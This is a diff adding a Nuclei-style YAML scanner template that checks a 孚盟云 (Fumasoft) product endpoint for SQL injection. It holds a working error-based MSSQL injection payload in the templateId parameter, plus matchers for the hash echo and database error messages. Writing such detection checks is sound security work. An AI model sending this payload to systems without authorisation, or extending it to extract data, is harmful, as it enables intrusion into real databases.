@@ -1,0 +1,31 @@
+id: poc-yaml-fumasoft-getprdtemplate-sqli
+info:
+  name: 孚盟云 GetPrdTemplate SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=GetPrdTemplate&templateId=1+and+1%3Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "\"message\":"
+          - "select  ID,Subject"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: status
+        status:
+          - 200
